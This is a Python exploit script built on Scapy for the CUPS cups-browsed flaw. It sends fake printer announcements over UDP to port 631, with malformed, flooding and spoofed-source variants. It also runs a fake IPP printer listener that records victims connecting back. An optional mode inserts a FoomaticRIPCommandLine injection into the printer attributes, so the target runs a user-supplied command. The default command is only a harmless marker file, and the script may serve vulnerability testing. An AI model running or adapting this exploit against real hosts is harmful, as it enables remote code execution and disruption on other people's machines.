#!/usr/bin/env python3
"""cups_attack.py sends a fake printer message to a vulnerable cups browsed
host and checks if it connects back. Built with Scapy."""
import argparse
import ipaddress
import json
import logging
import socket
import sys
import threading
import time
from dataclasses import dataclass, field

from scapy.all import IP, UDP, Raw, send, AsyncSniffer, wrpcap  # type: ignore

from browse_proto import build_browse_message
from ipp_mini import (
    parse_ipp_request, build_get_printer_attributes_response, TAG_URI,
    recv_http_ipp_request, build_http_ipp_response,
)

log = logging.getLogger("cups_attack")


# Each function below builds the fake message in a different way.

def variant_basic(args) -> bytes:
    """A normal message, but it points at our own listener."""
    uri = "%s://%s:%d/printers/%s" % (args.scheme, args.attacker_ip, args.ipp_port, args.printer_name)
    return build_browse_message(args.printer_type, args.printer_state, uri, args.location, args.info)


def variant_malformed(args) -> bytes:
    """Breaks the message on purpose in a few different ways."""
    uri = "%s://%s:%d/printers/%s" % (args.scheme, args.attacker_ip, args.ipp_port, args.printer_name)
    sub = args.malformed_sub
    if sub == "oversized-info":
        info = "A" * 4000  # very long text field
        return build_browse_message(args.printer_type, args.printer_state, uri, args.location, info)
    if sub == "bad-hex-type":
        # the type and state fields should be numbers, send letters instead
        msg = '%s %s %s "%s" "%s"' % ("ZZZZ", "----", uri, args.location, args.info)
        return msg.encode()
    if sub == "control-chars":
        info = "evil\r\nprinter\x00\x07" + args.info
        return build_browse_message(args.printer_type, args.printer_state, uri, args.location, info)
    if sub == "missing-quotes":
        msg = "%x %x %s %s %s" % (args.printer_type, args.printer_state, uri, args.location, args.info)
        return msg.encode()
    raise ValueError("unknown --malformed-sub %r" % sub)


def variant_flood(args) -> bytes:
    """Same message as basic, sent many times fast."""
    return variant_basic(args)


def variant_spoofed(args) -> bytes:
    """Same message as basic, but the sender address is faked."""
    return variant_basic(args)


VARIANT_BUILDERS = {
    "basic": variant_basic,
    "malformed": variant_malformed,
    "flood": variant_flood,
    "spoofed": variant_spoofed,
}


def build_packet(args, payload: bytes):
    src = args.spoof_src if (args.variant == "spoofed" and args.spoof_src) else None
    ip_layer = IP(dst=args.target_ip, src=src) if src else IP(dst=args.target_ip)
    pkt = ip_layer / UDP(sport=args.sport, dport=args.target_port) / Raw(load=payload)
    return pkt


def send_packets(args) -> list:
    builder = VARIANT_BUILDERS[args.variant]
    sent = []
    for i in range(args.count):
        payload = builder(args)
        pkt = build_packet(args, payload)
        log.info(
            "[%s] sending UDP %s:%d to %s:%d (%d bytes) spoofed source is %s",
            args.variant, pkt[IP].src, args.sport, args.target_ip, args.target_port,
            len(payload), bool(args.variant == "spoofed" and args.spoof_src),
        )
        log.debug("payload: %r", payload)
        send(pkt, verbose=False, iface=args.iface)
        sent.append(pkt)
        if i + 1 < args.count:
            time.sleep(args.interval)
    return sent


# This small listener catches the victim connecting back to us.

@dataclass
class CallbackEvent:
    peer_ip: str
    peer_port: int
    timestamp: float
    operation: str
    request_id: int
    raw_len: int


@dataclass
class ListenerState:
    events: list = field(default_factory=list)
    lock: threading.Lock = field(default_factory=threading.Lock)

    def record(self, ev: CallbackEvent):
        with self.lock:
            self.events.append(ev)


def handle_conn(conn, addr, state: ListenerState, args):
    try:
        parsed = recv_http_ipp_request(conn)
        if not parsed:
            log.info("connection from %s:%d closed early", addr[0], addr[1])
            return
        _request_line, _headers, data = parsed
        req = parse_ipp_request(data)
        if req is None:
            log.info("not an IPP request from %s:%d (%d bytes)", addr[0], addr[1], len(data))
            state.record(CallbackEvent(addr[0], addr[1], time.time(), "not_ipp", -1, len(data)))
            return

        log.warning(
            "VICTIM CALLBACK: %s connected and asked for %s (request id %d)",
            addr[0], req.operation_name, req.request_id,
        )
        state.record(CallbackEvent(addr[0], addr[1], time.time(), req.operation_name, req.request_id, len(data)))

        extra = []
        if args.rce_demo:
            # copies the known public demo for this bug, off unless asked for
            payload = (
                'https://example.invalid/"\n*FoomaticRIPCommandLine: "'
                + args.rce_command + '"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'
            ).encode()
            extra.append((TAG_URI, "printer-privacy-policy-uri", payload))
            log.warning("rce demo is on, adding the hidden command to the reply")
        else:
            extra.append((0x41, "printer-info", b"ATTACKER CONTROLLED VIRTUAL PRINTER (demo only, no hidden command)"))

        resp = build_get_printer_attributes_response(req.request_id, extra_attrs=extra)
        conn.sendall(build_http_ipp_response(resp))
    except Exception as exc:
        log.error("listener error with %s: %s", addr, exc)
    finally:
        conn.close()


def run_listener(args, state: ListenerState, stop_event: threading.Event):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.settimeout(1.0)
    srv.bind((args.attacker_ip, args.ipp_port))
    srv.listen(5)
    log.info("listener ready on %s:%d", args.attacker_ip, args.ipp_port)
    while not stop_event.is_set():
        try:
            conn, addr = srv.accept()
        except socket.timeout:
            continue
        threading.Thread(target=handle_conn, args=(conn, addr, state, args), daemon=True).start()
    srv.close()


def parse_args(argv=None):
    ap = argparse.ArgumentParser(
        description="Send a fake CUPS printer message and check if the target connects back.",
    )
    ap.add_argument("--target-ip", required=True, help="the victim running cups browsed")
    ap.add_argument("--target-port", type=int, default=631)
    ap.add_argument("--sport", type=int, default=0, help="UDP source port, 0 lets scapy pick one")
    ap.add_argument("--iface", default=None, help="network interface to use")

    ap.add_argument("--attacker-ip", required=True, help="the address the fake printer should point at")
    ap.add_argument("--ipp-port", type=int, default=16311, help="port the fake printer listener uses")
    ap.add_argument("--scheme", default="ipp", choices=["ipp", "http"])
    ap.add_argument("--printer-name", default="EVIL-PRINTER")
    ap.add_argument("--location", default="Attacker Controlled")
    ap.add_argument("--info", default="Totally Legit Printer")
    ap.add_argument("--printer-type", type=lambda s: int(s, 16), default=0x0, help="hex printer type value")
    ap.add_argument("--printer-state", type=lambda s: int(s, 16), default=0x3, help="hex printer state value")

    ap.add_argument("--variant", choices=list(VARIANT_BUILDERS), default="basic")
    ap.add_argument("--malformed-sub", choices=["oversized-info", "bad-hex-type", "control-chars", "missing-quotes"],
                     default="oversized-info", help="which broken version to send when variant is malformed")
    ap.add_argument("--spoof-src", default=None, help="address to fake as the sender when variant is spoofed")

    ap.add_argument("--count", type=int, default=1, help="how many times to send the message")
    ap.add_argument("--interval", type=float, default=1.0, help="seconds to wait between sends")

    ap.add_argument("--no-listener", dest="listener", action="store_false", default=True,
                     help="turn off the callback listener, only send packets")
    ap.add_argument("--wait-seconds", type=float, default=15.0, help="how long to wait for a callback")

    ap.add_argument("--rce-demo", action="store_true",
                     help="also add the public hidden command demo to the reply, off by default")
    ap.add_argument("--rce-command", default="echo 1 > /tmp/I_AM_VULNERABLE",
                     help="the command text used when rce demo is on, this tool never runs it")

    ap.add_argument("--sniff", dest="sniff", action="store_true", default=True)
    ap.add_argument("--no-sniff", dest="sniff", action="store_false",
                     help="turn off saving a pcap file of the traffic")
    ap.add_argument("--pcap-out", default=None, help="file to save the captured packets to")
    ap.add_argument("--log-file", default=None)
    ap.add_argument("--summary-json", default=None, help="file to save a short summary of the run to")
    ap.add_argument("-v", "--verbose", action="store_true")
    return ap.parse_args(argv)


def setup_logging(args):
    level = logging.DEBUG if args.verbose else logging.INFO
    handlers = [logging.StreamHandler(sys.stdout)]
    if args.log_file:
        handlers.append(logging.FileHandler(args.log_file))
    logging.basicConfig(level=level, format="%(asctime)s %(levelname)s %(message)s", handlers=handlers)


def main():
    args = parse_args()
    setup_logging(args)

    try:
        ipaddress.ip_address(args.target_ip)
        ipaddress.ip_address(args.attacker_ip)
    except ValueError as exc:
        log.error("that is not a valid address: %s", exc)
        sys.exit(2)

    sniffer = None
    captured_pkts = []
    if args.sniff:
        bpf = "udp port %d or tcp port %d" % (args.target_port, args.ipp_port)
        sniffer = AsyncSniffer(filter=bpf, iface=args.iface, store=True)
        sniffer.start()
        time.sleep(0.3)  # give the sniffer time to start

    state = ListenerState()
    stop_event = threading.Event()
    listener_thread = None
    if args.listener:
        listener_thread = threading.Thread(target=run_listener, args=(args, state, stop_event), daemon=True)
        listener_thread.start()
        time.sleep(0.3)

    sent_pkts = send_packets(args)

    if args.listener:
        log.info("waiting up to %.0f seconds for the victim to connect back", args.wait_seconds)
        time.sleep(args.wait_seconds)
        stop_event.set()
        if listener_thread:
            listener_thread.join(timeout=2)

    if sniffer:
        time.sleep(0.5)
        captured_pkts = sniffer.stop()

    if args.pcap_out:
        all_pkts = list(captured_pkts) if captured_pkts else list(sent_pkts)
        wrpcap(args.pcap_out, all_pkts)
        log.info("wrote %d packets to %s", len(all_pkts), args.pcap_out)

    callback_observed = len(state.events) > 0
    summary = {
        "variant": args.variant,
        "target_ip": args.target_ip,
        "attacker_ip": args.attacker_ip,
        "packets_sent": len(sent_pkts),
        "callback_observed": callback_observed,
        "callback_events": [
            {
                "peer_ip": e.peer_ip, "peer_port": e.peer_port, "timestamp": e.timestamp,
                "operation": e.operation, "request_id": e.request_id, "raw_len": e.raw_len,
            } for e in state.events
        ],
    }
    if callback_observed:
        log.warning("RESULT: the victim did connect back to our fake printer. %d callback event(s).",
                    len(state.events))
    elif args.listener:
        log.info("RESULT: no callback seen within %.0f seconds", args.wait_seconds)
    else:
        log.info("RESULT: listener was off, packets were sent only")

    if args.summary_json:
        with open(args.summary_json, "w") as f:
            json.dump(summary, f, indent=2)
        log.info("wrote run summary to %s", args.summary_json)

    print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
